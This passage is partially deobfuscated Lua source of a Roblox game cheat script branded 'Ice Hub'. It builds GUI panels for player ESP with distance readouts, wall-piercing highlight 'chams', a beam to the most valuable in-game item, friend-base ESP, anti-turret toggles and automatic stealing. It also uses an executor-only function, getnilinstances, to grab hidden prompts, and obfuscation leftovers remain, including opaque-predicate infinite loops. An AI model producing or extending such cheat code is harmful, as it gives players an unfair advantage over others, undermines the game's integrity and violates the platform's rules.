										if not (not v102 or not tbl18.toggles.friendBaseESP) then
											for _, child in ipairs(v102:GetChildren()) do
												if child:IsA("Model") and fn62(child) then
													fn80(child)
												end
											end

											return
										end

										if not (n25 < 3899) then
											return
										end

										while true do
										end
									end

									local function fn83(arg)
										if not arg then
											return nil
										end
										local v102 = fn62(arg)

										if v102 then
											if v102:IsA("BasePart") then
												return v102.Position
											end

											if v102:IsA(v82[114]) and v102.Parent and v102.Parent:IsA("BasePart") then
												if not flag2 then
													return
												end
												return v102.WorldPosition
											end

											if v102:IsA(v82[183]) then
												local ok, result = pcall(function()
													return v102:GetPivot().Position
												end)

												if ok and result then
													return result
												end
											end
										end

										local position = nil

										pcall(function()
											position = arg.PrimaryPart and arg.PrimaryPart.Position or arg:GetPivot().Position
										end)

										if not position then
											local basePart = arg:FindFirstChildWhichIsA("BasePart", true)

											if basePart then
												position = basePart.Position
											end
										end

										return position
									end

									local v102 = fn56()

									if v102 then
										for _, descendant in ipairs(v102:GetDescendants()) do
											if descendant:IsA("BillboardGui") and descendant.Name == "ICE_HUB_FRIEND_BASE_ESP" then
												pcall(function()
													descendant:Destroy()
												end)
											elseif descendant:IsA("BasePart") and descendant.Name == "IceHubFriendEspAnchor" then
												pcall(function()
													descendant:Destroy()
												end)
											end
										end
									end

									local screenGui3 = Instance.new("ScreenGui")
									screenGui3.Name = "ICE_HUB_FRIEND_PANEL"
									screenGui3:SetAttribute("IceHubOwned", true)
									screenGui3.ResetOnSpawn = false
									screenGui3.DisplayOrder = v82[117]
									screenGui3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
									fn29(screenGui3)
									local n37 = isMobile and 215 or 225
									local n38 = isMobile and 126 or 132
									local instance4 = Instance.new(v82[53])
									tbl17.friendFrame = instance4
									instance4.Name = "FriendWindow"
									instance4.Size = UDim2.new(0, n37, 0, n38)
									fn37(instance4, "friendPanel", UDim2.new(0.02, 270, 0.5, -n38 / v82[23]))
									instance4.BackgroundColor3 = Color3.fromRGB(12, 38, 76)
									instance4.BackgroundTransparency = 0.24
									instance4.BorderSizePixel = 0
									instance4.Active = true
									instance4.ZIndex = v82[69]
									instance4.Parent = screenGui3
									createUICorner(instance4, 14)
									createUIStroke(instance4, v82[23])
									local uiGradient2 = Instance.new("UIGradient")
									local colorSequence2 = ColorSequence.new
									local tbl24 = {}
									local v103 = ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 32, 67))
									local v104 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(v82[69], 66, 118))
									local new2 = ColorSequenceKeypoint.new
									local color2 = Color3.fromRGB
									local v105 = v82[36]
									tbl24[1] = v103
									tbl24[2] = v104

									do
										local values = table.pack(new2(1, color2(v105, 28, 61)))
										table.move(values, 1, values.n, 3, tbl24)
									end

									uiGradient2.Color = colorSequence2(tbl24)
									uiGradient2.Rotation = 135
									uiGradient2.Parent = instance4
									local frame8 = Instance.new("Frame")
									frame8.Size = UDim2.new(v82[118], 0, 0, 36)
									frame8.BackgroundTransparency = 1
									frame8.BorderSizePixel = 0
									frame8.ZIndex = v82[164]
									frame8.Parent = instance4

									if v84 then
										local imageLabel = Instance.new("ImageLabel")
										imageLabel.Size = UDim2.new(0, 24, 0, v82[58])
										imageLabel.Position = UDim2.new(0, 8, v82[91], -12)
										imageLabel.BackgroundTransparency = 1
										imageLabel.Image = v84
										imageLabel.ScaleType = Enum.ScaleType.Fit
										imageLabel.ZIndex = 22
										imageLabel.Parent = frame8
									end

									local instance5 = Instance.new(v82[176])
									instance5.Size = UDim2.new(1, -45, 1, 0)
									instance5.Position = UDim2.new(v82[46], 38, v82[46], 0)
									instance5.BackgroundTransparency = v82[118]
									instance5.Text = "Ice Hub - Friends"
									instance5.TextColor3 = tbl17.COL_WHITE
									instance5.TextSize = isMobile and v82[78] or 13
									instance5.Font = Enum.Font.GothamBlack
									instance5.TextXAlignment = Enum.TextXAlignment.Left
									instance5.ZIndex = 22
									instance5.Parent = frame8
									local frame9 = Instance.new("Frame")
									frame9.Size = UDim2.new(1, -16, 1, -43)
									frame9.Position = UDim2.new(v82[46], v82[90], v82[46], 39)
									frame9.BackgroundTransparency = 1
									frame9.BorderSizePixel = v82[46]
									frame9.ZIndex = 21
									frame9.Parent = instance4
									local uiListLayout2 = Instance.new("UIListLayout")
									uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
									uiListLayout2.Padding = UDim.new(0, 6)
									uiListLayout2.HorizontalAlignment = Enum.HorizontalAlignment.Center
									uiListLayout2.Parent = frame9

									local toggleFriends = createFrame2(frame9, "TOGGLE FRIENDS", function()
										fn77()
									end)

									if toggleFriends then
										toggleFriends.Size = UDim2.new(1, v82[46], v82[46], isMobile and v82[177] or 32)
										toggleFriends.BackgroundColor3 = Color3.fromRGB(v82[69], 72, v82[186])
										toggleFriends.BackgroundTransparency = v82[135]
										createUIStroke(toggleFriends, v82[118])
									end

									local baseEsp = createFrame(frame9, "Base ESP", tbl18.toggles.friendBaseESP ~= v82[120], function(friendBaseESP)
										tbl18.toggles.friendBaseESP = friendBaseESP
										fn36()
										fn82()
									end)

									if baseEsp then
										baseEsp.Size = UDim2.new(1, v82[46], v82[46], isMobile and 30 or 28)
										baseEsp.BackgroundColor3 = Color3.fromRGB(15, 50, 94)
										baseEsp.BackgroundTransparency = 0.18
									end

									fn48(instance4, frame8, "friendPanel")
									fn82()
									local v106 = fn75()
									local v107 = v106 and fn63(v106)
									local v108

									if v106 and not v107 and type(getnilinstances) == "function" then
										local v109 = fn62(v106)

										if v109 then
											local ok, result = pcall(getnilinstances)

											if ok and type(result) == "table" then
												for _, v110 in ipairs(result) do
													if typeof(v110) == "Instance" and v110:IsA("ProximityPrompt") then
														local str8 = (tostring(v110.ActionText or "") .. " " .. tostring(v110.ObjectText or "")):lower()

														if str8:find("friend", 1, true) or str8:find("allow friends", 1, true) or str8:find(v82[112], 1, true) then
															if pcall(function()
																v110.Parent = v109
															end) then
																obj2[v106] = v110
																v107 = v110
																break
															end
														end
													end
												end
											end
										end

										v108 = v107
									else
										v108 = v107
									end

									if v108 then
										fn66(v108)
									end

									if v106 then
										local v109 = fn74(v106)

										if v109 ~= nil then
											fn72(v106, v109)
										end

										if tbl22[v106] then
											fn76(v106)
										end
									end

									local v109 = fn56()
									local v110 = v82[46]
									local obj7 = setmetatable({}, { __mode = "k" })

									local function fn84(arg)
										if not arg or not arg:IsA("Model") then
											return
										end
										local v111 = fn60(arg)

										if v111 then
											v98 = arg
										end

										local v112 = fn63(arg)

										if v112 then
											fn81(arg, v112)

											if v111 then
												fn66(v112)
											else
												fn67(v112)
											end
										end

										if fn62(arg) then
											local v113 = fn74(arg)

											if v113 ~= nil then
												obj5[arg] = v113
											end

											if not flag2 then
												return
											end

											if tbl18.toggles.friendBaseESP then
												if not tbl22[arg] then
													fn80(arg)
												else
													fn76(arg)
												end
											end
										end
									end

									local v111 = nil
									local n39 = 0

									if v109 then
										for _, child in ipairs(v109:GetChildren()) do
											fn84(child)
										end

										v109.ChildAdded:Connect(function(child)
											v99 = nil
											v100 = nil
											task.defer(fn84, child)
										end)

										v109.ChildRemoved:Connect(function(child)
											if v98 == child then
												v98 = nil
											end

											if v99 == child then
												v99 = nil
											end

											if v100 == child then
												v100 = nil
											end

											if tbl22[child] then
												fn79(child)
											end
										end)

										v109.DescendantAdded:Connect(function(descendant)
											if not descendant:IsA("ProximityPrompt") then
												return
											end
											local parent2 = descendant

											while parent2 and parent2.Parent ~= v109 do
												parent2 = parent2.Parent
											end

											if parent2 and parent2.Parent == v109 then
												obj2[parent2] = descendant
												fn81(parent2, descendant)

												if fn60(parent2) then
													if n26(v82[40]) >= 3490 then
														fn66(descendant)
													else
														while true do
														end
													end
												else
													fn67(descendant)
												end
											end
										end)

										v111 = nil
									end

									while fn55() and task.wait(0.1) do
										v110 += 1

										if v110 >= 8 then
											v110 = v82[46]

											if tbl18.toggles.friendBaseESP then
												for k in pairs(tbl22) do
													if k.Parent then
														fn76(k)
													else
														fn79(k)
													end
												end
											end
										end

										if semitp.autoSemiOnFriends then
											local character = localPlayer.Character
											local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

											if humanoidRootPart and v109 then
												local flag21 = (humanoidRootPart.Position - tbl19.b1.refVec).Magnitude < (humanoidRootPart.Position - tbl19.b2.refVec).Magnitude

												if v111 ~= flag21 then
													obj7 = setmetatable({}, { __mode = "k" })
													v111 = flag21
												end

												for _, child in ipairs(v109:GetChildren()) do
													if child:IsA("Model") and not fn60(child) and fn62(child) then
														local v112 = fn83(child)

														if v112 then
															if (v112 - tbl19.b1.refVec).Magnitude < (v112 - tbl19.b2.refVec).Magnitude ~= flag21 then
																local v113 = fn63(child)
																v113 = v113 and fn64(v113) or nil

																if v113 == nil then
																	local v114 = obj4[child]

																	if v114 and v114.Parent then
																		v113 = fn71(v114)
																	end
																end

																if v113 == nil then
																	v113 = obj5[child]
																end

																if v113 == nil and v110 == 0 then
																	v113 = fn74(child)
																end

																if obj7[child] == false and v113 == true then
																	local now2 = tick()

																	if now2 - n39 >= 0.8 and not halfwaySteal.debounce and not localPlayer:GetAttribute("Stealing") then
																		task.spawn(function()
																			pcall(halfwaySteal.execute)
																		end)

																		n39 = now2
																	end
																end

																if v113 ~= nil then
																	obj7[child] = v113
																end
															end
														end
													end
												end
											end
										else
											obj7 = setmetatable({}, { __mode = v82[119] })
											v111 = nil
										end
									end

									for k in pairs(tbl22) do
										fn79(k)
									end

									if screenGui3 and screenGui3.Parent then
										pcall(function()
											screenGui3:Destroy()
										end)
									end
								end)
							end)

							task.spawn(function()
								local v92 = tbl17
								local v93 = tbl17
								local v94 = tbl17
								local v95 = tbl17
								local antiBalloon, v96, v97, v98 = fn51("Anti Balloon", "balloon")
								v92.balloonFrame = antiBalloon
								v93.balloonContent = v96
								v94.openBalloonPanel = v97
								v95.closeBalloonPanel = v98

								createFrame(tbl17.balloonContent, "Auto Reset On Balloon", tbl17.AutoResetBalloonEnabled, function(autoResetBalloonEnabled)
									tbl17.AutoResetBalloonEnabled = autoResetBalloonEnabled
									tbl18.toggles.autoResetBalloon = autoResetBalloonEnabled
									fn36()

									if autoResetBalloonEnabled then
										fn42()
									else
										fn43()
									end
								end)
							end)

							task.spawn(function()
								if not (isMobile and 220) then
								end

								local v92 = tbl17
								local v93 = tbl17
								local v94 = tbl17
								local v95 = tbl17
								local antiTurret, v96, v97, v98 = fn51("Anti Turret", v82[2])
								v92.turretFrame = antiTurret
								v93.turretContent = v96
								v94.openTurretPanel = v97
								v95.closeTurretPanel = v98

								createFrame(tbl17.turretContent, "Anti Turret", tbl17.sentryEnabled, function(sentryEnabled)
									tbl17.sentryEnabled = sentryEnabled
									tbl18.toggles.antiTurret = sentryEnabled
									fn36()

									if sentryEnabled then
										fn44()
									else
										fn45()
									end
								end)
							end)

							task.spawn(function()
								local v92 = tbl17
								local v93 = tbl17
								local v94 = tbl17
								local v95 = tbl17
								local gameStretcher, v96, v97, v98 = fn51("Game Stretcher", "stretch")
								v92.stretchFrame = gameStretcher
								v93.stretchContent = v96
								v94.openStretchPanel = v97
								v95.closeStretchPanel = v98

								createFrame(tbl17.stretchContent, v82[193], tbl17.gameStretcherEnabled, function(arg)
									if arg then
										fn46()
									else
										fn47()
									end
								end)
							end)

							task.spawn(function()
								if not (isMobile and v82[9]) then
								end

								if isMobile then
								end

								local v92 = tbl17
								local v93 = tbl17
								local v94 = tbl17
								local v95 = tbl17
								local v96, v97, v98, v99 = fn51("FPS & Effects", "xray")
								v92.xpFrame = v96
								v93.xpContent = v97
								v94.openXrayPanel = v98
								v95.closeXrayPanel = v99

								createFrame(tbl17.xpContent, "Anti Lag", tbl18.toggles.antiLag or false, function(antiLag)
									tbl18.toggles.antiLag = antiLag
									fn36()

									if antiLag then
										fn35()

										for _, descendant in pairs(service3:GetDescendants()) do
											fn34(descendant)
										end

										if not _G.antiLagConn then
											_G.antiLagConn = service3.DescendantAdded:Connect(function(descendant)
												if tbl18.toggles.antiLag then
													if n24 <= 9583 then
														while v82[76] do
														end
													end

													fn34(descendant)
												end
											end)
										end
									elseif _G.antiLagConn then
										_G.antiLagConn:Disconnect()
										_G.antiLagConn = nil
									end
								end)

								createFrame(tbl17.xpContent, "FPS Booster", tbl18.toggles.fpsBooster or false, function(fpsBooster)
									tbl18.toggles.fpsBooster = fpsBooster
									fn36()

									if fpsBooster then
										fn35()

										for _, descendant in pairs(service3:GetDescendants()) do
											fn34(descendant)
										end
									end
								end)

								createFrame(tbl17.xpContent, "No Particles", tbl18.toggles.noParticles or v82[120], function(noParticles)
									tbl18.toggles.noParticles = noParticles
									fn36()

									if noParticles then
										_G.noParticlesEnabled = true

										for _, descendant in pairs(service3:GetDescendants()) do
											if descendant:IsA("ParticleEmitter") or descendant:IsA("Smoke") or descendant:IsA("Fire") or descendant:IsA("Sparkles") then
												pcall(function()
													descendant.Enabled = false
												end)
											end
										end

										_G.noParticlesConn = service3.DescendantAdded:Connect(function(descendant)
											if not _G.noParticlesEnabled then
												return
											end

											if descendant:IsA("ParticleEmitter") or descendant:IsA("Smoke") or descendant:IsA("Fire") or descendant:IsA("Sparkles") then
												pcall(function()
													descendant.Enabled = false
												end)
											end
										end)
									else
										_G.noParticlesEnabled = v82[120]

										if _G.noParticlesConn then
											_G.noParticlesConn:Disconnect()
											_G.noParticlesConn = nil
										end
									end
								end)
							end)

							task.spawn(function()
								if isMobile then
								end

								local v92 = tbl17
								local v93 = tbl17
								local v94 = tbl17
								local v95 = tbl17
								local Booster, v96, v97, v98 = fn51("Booster", "booster")
								v92.bpFrame = Booster
								v93.bpContent = v96
								v94.openBoosterPanel = v97
								v95.closeBoosterPanel = v98
							end)

							tbl20 = {
								enabled = false,
								folder = nil,
								thread = nil,
								bestPart = nil,
								nodes = {},
								conns = {},
								primed = false,
								dirty = true,
							}

							fn53 = function(arg)
								if not arg or arg == "" then
									return v82[46]
								end
								local str8 = tostring(arg):gsub("%s", ""):gsub(",", ""):gsub("%$", "")
								local tbl21 = { K = 1000, k = 1000, M = 1000000, m = 1000000, B = 1e9, b = 1e9, T = 1e12, t = 1e12 }
								local match, v92 = str8:match("([%d%.]+)([KkMmBbTt]?)")

								if match then
									match = (tonumber(match) or 0) * (tbl21[v92] or v82[118])
								end

								return match or v82[46]
							end

							do
								local function fn55(arg)
									local str8 = tostring(arg or ""):lower()
									local v92 = v82[76]
									return str8:find(localPlayer.Name:lower(), 1, v92) ~= nil or str8:find(localPlayer.DisplayName:lower(), v82[118], true) ~= nil or str8 == tostring(localPlayer.UserId)
								end

								local function fn56(arg)
									if not arg then
										return false
									end

									for _, v92 in ipairs({ "Owner", "OwnerId", "OwnerUserId", "UserId", "owner", "ownerId" }) do
										local attribute = arg:GetAttribute(v92)
										if attribute ~= nil and fn55(attribute) then
											return v82[76]
										end
									end

									local owner = arg:FindFirstChild("Owner", true)

									if owner then
										if owner:IsA("ObjectValue") and owner.Value == localPlayer then
											return true
										end

										if (owner:IsA("StringValue") or owner:IsA("IntValue") or owner:IsA("NumberValue")) and fn55(owner.Value) then
											return v82[76]
										end
									end

									local plotSign = arg:FindFirstChild("PlotSign")
									local v92 = plotSign and plotSign:FindFirstChild(v82[83], true)
									if v92 and v92:IsA("BillboardGui") and v92.Enabled then
										return true
									end
									plotSign = plotSign and plotSign:FindFirstChild("SurfaceGui")
									plotSign = plotSign and plotSign:FindFirstChild("Frame")
									plotSign = plotSign and plotSign:FindFirstChild("TextLabel")
									if plotSign and plotSign:IsA(v82[176]) and fn55(plotSign.Text) then
										return true
									end
									return false
								end

								fn54 = function(arg)
									local plots = service3:FindFirstChild("Plots")
									if not plots or not arg then
										return nil, false
									end
									local parent = arg

									while parent and parent ~= service3 do
										if parent.Parent == plots and parent:IsA("Model") then
											return parent, fn56(parent)
										end
										parent = parent.Parent
									end

									local position = arg.Position

									for _, child in ipairs(plots:GetChildren()) do
										local ok, result, result2 = pcall(function()
											return child:GetBoundingBox()
										end)

										if ok and result and result2 then
											local v92 = result:PointToObjectSpace(position)
											local n35 = result2.X / 2 + v82[61]
											local flag18 = math.abs(v92.X) <= n35

											if flag18 then
												local n36 = result2.Y / v82[23] + 50
												flag18 = math.abs(v92.Y) <= n36
											end

											if flag18 then
												local n36 = result2.Z / 2 + 5
												flag18 = math.abs(v92.Z) <= n36
											end

											if flag18 then
												return child, fn56(child)
											end
										end
									end

									return nil, false
								end
							end
						end

						local fn55

						do
							do
								local function fn56(arg)
									local surfaceGui = arg and arg:FindFirstChildWhichIsA("SurfaceGui", v82[76])
									if not surfaceGui then
										return nil
									end
									local displayName = surfaceGui:FindFirstChild("DisplayName", true)
									local generation = surfaceGui:FindFirstChild("Generation", true) or surfaceGui:FindFirstChild("Speed", v82[76])
									if not displayName or not generation or not displayName:IsA("TextLabel") or not generation:IsA("TextLabel") then
										return nil
									end

									if displayName.Text == "" or displayName.Text == "Brainrot" or generation.Text == "" then
										return nil
									end
									local adornee = surfaceGui.Adornee and surfaceGui.Adornee:IsA(v82[70]) and surfaceGui.Adornee or arg:IsA(v82[70]) and arg or arg:FindFirstChildWhichIsA(v82[70], v82[76])
									if not adornee then
										return nil
									end
									return displayName.Text, generation.Text, fn53(generation.Text), adornee
								end

								fn55 = function()
									local tbl21 = {}

									for k in pairs(tbl20.nodes) do
										if not k or not k.Parent or k.Name ~= "FastOverheadTemplate" then
											tbl20.nodes[k] = nil
										else
											local v92, v93, v94, v95 = fn56(k)

											if v92 then
												local v96, v97 = fn54(v95)
												local flag18 = not v97

												if flag18 then
													flag18 = not (localPlayer.Character and (k:IsDescendantOf(localPlayer.Character) or v95:IsDescendantOf(localPlayer.Character)))
												end

												if flag18 then
													table.insert(tbl21, { tp = k, name = v92, gen = v93, val = v94, ad = v95, plot = v96 })
												end
											end
										end
									end

									return tbl21
								end
							end
						end

						do
							local function fn56(arg, arg2)
								if not tbl20.folder then
									return
								end
								local billboardGui = Instance.new("BillboardGui")
								billboardGui.Name = v83()
								billboardGui.Size = UDim2.new(0, 190, v82[46], 48)
								billboardGui.AlwaysOnTop = true
								billboardGui.StudsOffset = Vector3.new(0, 3, 0)
								billboardGui.Adornee = arg.ad
								billboardGui.MaxDistance = 2000
								billboardGui.Parent = tbl20.folder
								local frame2 = Instance.new("Frame")
								frame2.Size = UDim2.new(1, 0, 1, v82[46])
								frame2.BackgroundColor3 = Color3.fromRGB(5, v82[190], 39)
								frame2.BackgroundTransparency = 0.14
								frame2.BorderSizePixel = v82[46]
								frame2.Parent = billboardGui
								createUICorner(frame2, 8)
								local instance2 = Instance.new(v82[140])
								instance2.Thickness = arg2 and 2.2 or 1.4
								instance2.Color = arg2 and Color3.fromRGB(190, 230, v82[196]) or Color3.fromRGB(75, 155, 255)
								instance2.Transparency = 0.12
								instance2.Parent = frame2
								local textLabel = Instance.new("TextLabel")
								textLabel.Size = UDim2.new(1, -10, 0, 22)
								textLabel.Position = UDim2.new(0, v82[61], v82[46], 3)
								textLabel.BackgroundTransparency = 1
								textLabel.TextScaled = true
								textLabel.Font = Enum.Font.GothamBlack
								textLabel.Text = (arg2 and "★ " or "") .. arg.name
								textLabel.TextColor3 = arg2 and Color3.fromRGB(v82[175], 248, 255) or Color3.fromRGB(125, 195, v82[196])
								textLabel.Parent = frame2
								local textLabel2 = Instance.new("TextLabel")
								textLabel2.Size = UDim2.new(1, -10, 0, 18)
								textLabel2.Position = UDim2.new(0, 5, v82[46], 26)
								textLabel2.BackgroundTransparency = 1
								textLabel2.TextScaled = v82[76]
								textLabel2.Font = Enum.Font.GothamBold
								textLabel2.Text = arg.gen
								textLabel2.TextColor3 = Color3.fromRGB(175, 220, 255)
								textLabel2.Parent = frame2
							end

							fn52 = function()
								if not tbl20.folder then
									return
								end
								tbl20.folder:ClearAllChildren()
								tbl20.bestPart = nil
								local v92 = fn55()
								local n35 = -v82[118]
								local n36 = -v82[118]
								local v93 = nil
								local v94 = nil

								for _, v95 in ipairs(v92) do
									if n35 < v95.val then
										n35 = v95.val
										v93 = v95
									end

									if not v95.plot and v95.val > n36 then
										n36 = v95.val
										v94 = v95
									end
								end

								if v93 then
									tbl20.bestPart = v93.ad
								end

								if tbl18.toggles.brainrotESP then
									for _, v95 in ipairs(v92) do
										if v95.plot or v95 == v94 then
											fn56(v95, v95 == v93)
										end
									end
								elseif tbl18.toggles.bestBrainrotESP and v93 then
									fn56(v93, true)
								end
							end
						end
					end

					local fn53, fn54, instance2, fn55, fn56, fn57

					do
						do
							do
								fn53 = function()
									if not tbl20.primed then
										tbl20.primed = v82[76]

										local function fn58(arg)
											if not arg then
												return
											end

											for _, descendant in ipairs(arg:GetDescendants()) do
												if descendant.Name == "FastOverheadTemplate" then
													tbl20.nodes[descendant] = true
												end
											end

											table.insert(tbl20.conns, arg.DescendantAdded:Connect(function(descendant)
												if descendant.Name == "FastOverheadTemplate" then
													tbl20.nodes[descendant] = true
													tbl20.dirty = true
												end
											end))

											table.insert(tbl20.conns, arg.DescendantRemoving:Connect(function(descendant)
												if tbl20.nodes[descendant] then
													tbl20.nodes[descendant] = nil
													tbl20.dirty = true
												end
											end))
										end

										fn58(service3:FindFirstChild("Debris"))
										fn58(service3:FindFirstChild("Plots"))

										table.insert(tbl20.conns, service3.ChildAdded:Connect(function(child)
											if child.Name == "Debris" or child.Name == "Plots" then
												fn58(child)
												tbl20.dirty = true
											end
										end))
									end

									tbl20.dirty = v82[76]

									if tbl20.thread then
										if not flag2 then
											return
										end
										return
									end

									tbl20.thread = task.spawn(function()
										while tbl18.toggles.brainrotESP or tbl18.toggles.bestBrainrotESP or tbl18.toggles.lineESP do
											if tbl20.dirty then
												tbl20.dirty = false
												pcall(fn52)
											end

											task.wait(0.25)
										end

										tbl20.thread = nil

										if tbl20.folder then
											tbl20.folder:ClearAllChildren()
										end
									end)
								end

								do
									local beam = nil
									local attachment = nil
									local instance3 = nil
									local connection = nil

									local function fn58()
										if connection then
											connection:Disconnect()
											connection = nil
										end

										if beam then
											beam:Destroy()
											beam = nil
										end

										if attachment then
											attachment:Destroy()
											attachment = nil
										end

										if instance3 then
											instance3:Destroy()
											instance3 = nil
										end
									end

									fn54 = function()
										fn58()
										fn53()

										connection = RunService.Heartbeat:Connect(function()
											if not tbl18.toggles.lineESP then
												return
											end
											local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
											local bestPart = tbl20.bestPart
											if not humanoidRootPart or not bestPart or not bestPart.Parent then
												return
											end

											if not beam then
												attachment = Instance.new("Attachment")
												attachment.Name = v83()
												attachment.Parent = humanoidRootPart
												instance3 = Instance.new(v82[114])
												instance3.Name = v83()
												instance3.Parent = bestPart
												beam = Instance.new("Beam")
												beam.Attachment0 = attachment
												beam.Attachment1 = instance3
												beam.FaceCamera = true
												beam.Width0 = 0.45
												beam.Width1 = 0.45
												local color = Color3.fromRGB
												local v92 = v82[9]
												local v93 = v82[196]
												beam.Color = ColorSequence.new(Color3.fromRGB(80, 165, 255), color(v92, 245, v93))
												beam.Transparency = NumberSequence.new(0.18)
												beam.LightEmission = 1
												beam.Parent = humanoidRootPart
											elseif instance3.Parent ~= bestPart then
												instance3.Parent = bestPart

												if n24 < 9578 then
													while true do
													end
												end
											end
										end)
									end

									task.spawn(function()
										local v92 = tbl17
										local v93 = tbl17
										local v94 = tbl17
										local v95 = tbl17
										local esp, v96, v97, v98 = fn51("ESP", "esp")
										v92.espFrame = esp
										v93.espContent = v96
										v94.openESPPanel = v97
										v95.closeESPPanel = v98

										if not tbl20.folder then
											tbl20.folder = Instance.new("Folder")
											tbl20.folder.Name = v83()
											tbl20.folder.Parent = screenGui
										end

										createFrame(tbl17.espContent, "Brainrot ESP", tbl18.toggles.brainrotESP or false, function(brainrotESP)
											tbl18.toggles.brainrotESP = brainrotESP
											fn36()

											if brainrotESP then
												fn53()
											elseif tbl20.folder then
												tbl20.folder:ClearAllChildren()
											end
										end)

										createFrame(tbl17.espContent, "Best Brainrot ESP", tbl18.toggles.bestBrainrotESP or false, function(bestBrainrotESP)
											tbl18.toggles.bestBrainrotESP = bestBrainrotESP
											fn36()

											if bestBrainrotESP then
												fn53()
											elseif not tbl18.toggles.brainrotESP and tbl20.folder then
												tbl20.folder:ClearAllChildren()
											end
										end)

										createFrame(tbl17.espContent, "Line to Best Brainrot", tbl18.toggles.lineESP or v82[120], function(lineESP)
											tbl18.toggles.lineESP = lineESP
											fn36()

											if lineESP then
												fn54()
											else
												fn58()
											end
										end)

										local color = Color3.fromRGB(0, v82[25], 255)
										local color2 = Color3.fromRGB(v82[32], 190, 255)

										local function createHighlight(adornee, name, fillTransparency)
											if not adornee or not adornee.Parent then
												return nil
											end
											local v99 = adornee:FindFirstChild(name)
											if v99 and v99:IsA("Highlight") then
												return v99
											end
											local highlight = Instance.new("Highlight")
											highlight.Name = name
											highlight.Adornee = adornee
											highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
											highlight.FillColor = color
											highlight.OutlineColor = color2
											highlight.FillTransparency = fillTransparency or 0.55
											highlight.OutlineTransparency = v82[46]
											highlight.Parent = adornee
											return highlight
										end

										local function fn59(arg, arg2)
											if not arg then
												return
											end

											for _, descendant in ipairs(arg:GetDescendants()) do
												if descendant:IsA("Highlight") and descendant.Name == arg2 then
													pcall(function()
														descendant:Destroy()
													end)
												end
											end

											if arg:IsA("Model") then
												local v99 = arg:FindFirstChild(arg2)

												if v99 and v99:IsA("Highlight") then
													pcall(function()
														v99:Destroy()
													end)
												end
											end
										end

										createFrame(tbl17.espContent, "Player ESP", tbl18.toggles.playerESP or false, function(playerESP)
											tbl18.toggles.playerESP = playerESP
											fn36()

											if playerESP then
												_G.playerESPEnabled = true
												_G.playerESPConns = _G.playerESPConns or {}

												local function fn60(arg)
													local character = arg.Character
													if not character or arg == localPlayer then
														return
													end
													local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
													local head = character:FindFirstChild("Head")
													if not humanoidRootPart or not head or character:FindFirstChild("IceHub_ESP") then
														return
													end
													Instance.new("BoolValue", character).Name = "IceHub_ESP"
													local billboardGui = Instance.new("BillboardGui")
													billboardGui.Name = "IceHub_ESP_Billboard"
													billboardGui.Adornee = head
													billboardGui.Size = UDim2.new(0, 200, 0, 40)
													billboardGui.StudsOffset = Vector3.new(0, v82[113], 0)
													billboardGui.AlwaysOnTop = true
													billboardGui.Parent = character
													local textLabel = Instance.new("TextLabel")
													textLabel.Size = UDim2.new(1, v82[46], 1, v82[46])
													textLabel.BackgroundTransparency = 1
													textLabel.TextColor3 = color2
													textLabel.TextStrokeTransparency = 0
													textLabel.TextStrokeColor3 = Color3.new(0, v82[46], 0)
													textLabel.TextScaled = v82[76]
													textLabel.Font = Enum.Font.GothamBold
													textLabel.Text = arg.DisplayName or arg.Name
													textLabel.Parent = billboardGui

													task.spawn(function()
														if n26(1838) <= 7926 then
															while character.Parent and _G.playerESPEnabled do
																local character2 = localPlayer.Character
																character2 = character2 and character2:FindFirstChild("HumanoidRootPart")

																if character2 and humanoidRootPart and humanoidRootPart.Parent then
																	textLabel.Text = (arg.DisplayName or arg.Name) .. " [" .. math.floor((character2.Position - humanoidRootPart.Position).Magnitude + 0.5) .. "m]"
																end

																task.wait(0.25)
															end

															return
														end

														while true do
														end
													end)
												end

												for _, player in pairs(Players:GetPlayers()) do
													if player ~= localPlayer and player.Character then
														fn60(player)
													end

													if player ~= localPlayer then
														table.insert(_G.playerESPConns, player.CharacterAdded:Connect(function()
															if _G.playerESPEnabled then
																task.wait(0.1)
																fn60(player)
															end
														end))
													end
												end
											else
												_G.playerESPEnabled = false
												local v99 = pairs
												local playerESPConns = _G.playerESPConns or {}

												for _, playerESPConn in v99(playerESPConns) do
													if playerESPConn and playerESPConn.Connected then
														playerESPConn:Disconnect()
													end
												end

												_G.playerESPConns = {}

												for _, player in ipairs(Players:GetPlayers()) do
													if player.Character then
														local iceHubEsp = player.Character:FindFirstChild("IceHub_ESP")
														local iceHubEspBillboard = player.Character:FindFirstChild("IceHub_ESP_Billboard")

														if iceHubEsp then
															iceHubEsp:Destroy()
														end

														if iceHubEspBillboard then
															iceHubEspBillboard:Destroy()
														end
													end
												end
											end
										end)

										local tbl21 = {}

										local function fn60(arg)
											if arg == localPlayer or not tbl18.toggles.playerChams then
												return
											end
											local character = arg.Character

											if character then
												createHighlight(character, "IceHub_PlayerChams", 0.62)
											end
										end

										local function fn61()
											for _, v99 in ipairs(tbl21) do
												pcall(function()
													v99:Disconnect()
												end)
											end

											tbl21 = {}

											for _, player in ipairs(Players:GetPlayers()) do
												if player.Character then
													fn59(player.Character, "IceHub_PlayerChams")
												end
											end

											if not (n25 < 3909) then
												return
											end

											while true do
											end
										end

										createFrame(tbl17.espContent, "Player Chams", tbl18.toggles.playerChams or false, function(playerChams)
											tbl18.toggles.playerChams = playerChams
											fn36()
											fn61()

											if playerChams then
												for _, player in ipairs(Players:GetPlayers()) do
													if player ~= localPlayer then
														fn60(player)

														table.insert(tbl21, player.CharacterAdded:Connect(function()
															task.wait(0.15)
															fn60(player)
														end))
													end
												end

												table.insert(tbl21, Players.PlayerAdded:Connect(function(player)
													table.insert(tbl21, player.CharacterAdded:Connect(function()
														task.wait(0.15)
														fn60(player)
													end))
												end))
											end
										end)

										local connection2 = nil

										local function fn62(arg)
											if tbl18.toggles.selfChams and arg then
												createHighlight(arg, "IceHub_SelfChams", 0.68)
											end
										end

										createFrame(tbl17.espContent, "Self Chams", tbl18.toggles.selfChams or false, function(selfChams)
											tbl18.toggles.selfChams = selfChams
											fn36()

											if connection2 then
												connection2:Disconnect()
												connection2 = nil
											end

											if localPlayer.Character then
												fn59(localPlayer.Character, "IceHub_SelfChams")
											end

											if selfChams then
